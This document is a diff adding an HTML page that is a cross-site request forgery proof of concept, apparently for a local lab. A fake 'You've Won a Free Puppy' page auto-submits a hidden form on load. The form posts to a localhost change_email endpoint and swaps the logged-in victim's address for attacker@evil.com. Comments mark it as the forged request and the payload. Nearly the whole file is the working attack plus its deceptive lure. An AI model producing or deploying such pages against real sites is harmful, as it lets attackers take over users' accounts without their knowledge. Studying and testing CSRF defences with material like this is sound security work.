@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You Won a Prize!</title>
+    <style>
+        body { 
+            font-family: sans-serif; 
+            text-align: center; 
+            background-color: #fce4ec; 
+            color: #d81b60; 
+            padding: 50px; 
+        }
+        h1 { 
+            color: #880e4f; 
+            font-size: 2.5em; 
+        }
+    </style>
+</head>
+<!-- 
+    The 'onload' event automatically executes the JavaScript 
+    to submit the hidden form when the page finishes loading.
+-->
+<body onload="document.getElementById('csrf-form').submit()">
+    <h1>🥳 Congratulations! You've Won a Free Puppy! 🐕</h1>
+    <p>We are just confirming your entry now. Please wait a moment...</p>
+
+    <!-- 
+        This is the FORGED REQUEST. It is hidden from the user, but targets 
+        the vulnerable application where the user is authenticated. 
+    -->
+    <form id="csrf-form" action="http://localhost:5000/change_email" method="POST" style="display: none;">
+        <!-- The malicious payload: the attacker's desired new email address. -->
+        <input type="hidden" name="email" value="attacker@evil.com">
+    </form>
+    
+    <script>
+        console.log("--- Attacker Script Running ---");
+        console.log("Forged request submitted to target server: http://localhost:5000/change_email");
+    </script>
+</body>
+</html>
